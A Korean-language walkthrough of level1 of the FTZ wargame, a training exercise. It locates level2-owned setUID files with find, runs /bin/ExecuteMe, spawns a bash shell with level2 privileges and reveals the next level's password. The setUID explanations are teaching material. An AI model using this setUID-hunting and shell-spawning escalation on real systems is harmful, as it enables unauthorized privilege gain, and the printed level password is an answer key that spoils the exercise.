## level1

#### 실행

``` //
[level1@ftz level1]$cat hint // hint 파일의 내용을 화면에 출력한다.
```

#### 결과

```
level2 권한에 setuid가 걸린 파일을 찾는다.
```

setUID가 설정된 파일은 실행할 때는 일시적으로 파일 소유자의 권한을 얻어 실행한다.

예를들어 root 권한 소유 프로그램에 setUID가 지정되어 있다면 실행할 때 root 권한으로 실행된다.

--------

#### 실행

```
[level1@ftz level1]$find / -user level2 -perm -4000 2>/dev/null // 루트 디렉토리부터 level2 소유의 최소 setUID가 설정되어 있는 파일을 찾고 표준 에러를 휴지통으로 리다이렉트한다.
```

ls -l 명령을 실행하면 파일이나 디렉토리의 소유권과 허가권을 확인할 수 있다.

소유권은 \[파일이나 디렉토리를 소유한 사용자][사용자가 속한 그룹] 형식으로 나타낸다.

허가권은 소유자|그룹|일반사용자 순으로 각각 r(읽기), w(쓰기), x(실행), -(권한 없음)을 표현한다.

setUID가 설정된 경우 소유자의 실행 권한이 s로 변환된다.

chmod 명령을 실행하여 파일이나 디렉토리의 허가권을 변경할 수 있다.

#### 결과

```/bin/ExceteMe
/bin/ExecuteMe
```

---------

#### 실행

```
[level1@ftz level1]$ cd /bin
[level1@ftz bin]$ ./ExecuteMe
```

#### 결과

```
레벨2의 권한으로 당신이 원하는 명령어를
한가지 실행시켜 드리겠습니다.
(단, my-pass와 chmod는 제외)

어떤 명령을 실행시키겠습니까?
```

-------------------

#### 실행

```
[level2@ftz level2]$/bin/bash // 셸 띄우기
```

#### 결과

```
Level2 Password is "hacker or cracker”.
```

